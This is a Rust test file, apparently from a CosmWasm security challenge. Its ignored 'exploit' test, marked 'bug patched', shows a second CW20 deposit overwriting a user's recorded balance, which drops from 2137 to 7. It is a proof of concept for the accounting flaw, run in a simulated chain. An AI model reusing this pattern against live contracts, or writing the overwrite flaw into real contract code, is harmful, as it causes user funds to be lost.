#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{Addr, Uint128};
    use cw20::{Cw20ReceiveMsg, MinterResponse};
    use cw_multi_test::{App, Executor};

    use crate::{integration_tests::tests::{challenge_contract, ADMIN, TOKEN_2, token_contract, TOKEN_1, USER}, msg::{InstantiateMsg, Cw20HookMsg, ExecuteMsg, UserResponse, QueryMsg}, assets::AssetInfo};

    #[ignore = "bug patched"]
    #[test]
    fn exploit(){
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());
        let cw_20_id = app.store_code(token_contract());

        let token_inst = cw20_base::msg::InstantiateMsg {
            name: TOKEN_1.to_string(),
            symbol: TOKEN_1.to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };
        let token_inst2 = cw20_base::msg::InstantiateMsg {
            name: TOKEN_2.to_string(),
            symbol: TOKEN_2.to_string(),
            decimals: 6,
            initial_balances: vec![],
            mint: Some(MinterResponse {
                minter: ADMIN.to_string(),
                cap: None,
            }),
            marketing: None,
        };
        let token_addr = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        let token_addr2 = app
            .instantiate_contract(
                cw_20_id,
                Addr::unchecked(ADMIN),
                &token_inst2,
                &[],
                "test",
                None,
            )
            .unwrap();


        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &InstantiateMsg { 
                    owner: Addr::unchecked(ADMIN).to_string(), 
                    asset_infos: vec![
                        AssetInfo::Token{contract_addr:token_addr.clone()},
                        AssetInfo::Token{contract_addr:token_addr2.clone()},

                        ]
                    },
                &[],
                "Contract",
                None,
            ).unwrap();

        let encoded = cosmwasm_std::to_binary(&Cw20HookMsg::Deposit {});
        app.execute_contract(
            token_addr.clone(), 
            contract_addr.clone(), 
            &ExecuteMsg::Receive(Cw20ReceiveMsg {
                sender: USER.to_string(),
                amount: Uint128::new(2137),
                msg: encoded.unwrap(),
            }), 
        &[]
        ).unwrap();
        
        let query_user_info: UserResponse = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(), 
                &QueryMsg::UserInfo{ user: USER.to_string()})
            .unwrap();
        assert_eq!(query_user_info , UserResponse{amount : Uint128::new(2137)});

        let encoded: Result<cosmwasm_std::Binary, cosmwasm_std::StdError> = cosmwasm_std::to_binary(&Cw20HookMsg::Deposit {});
        app.execute_contract(
            token_addr,
            contract_addr.clone(), 
            &ExecuteMsg::Receive(Cw20ReceiveMsg {
                sender: USER.to_string(),
                amount: Uint128::new(7),
                msg: encoded.unwrap(),
            }), 
            &[]
        ).unwrap();


        let query_user_info: UserResponse = app
            .wrap()
            .query_wasm_smart(
                contract_addr, 
                &QueryMsg::UserInfo{ user:USER.to_string()})
            .unwrap();
        assert_eq!(query_user_info , UserResponse{amount : Uint128::new(7)});
    }
}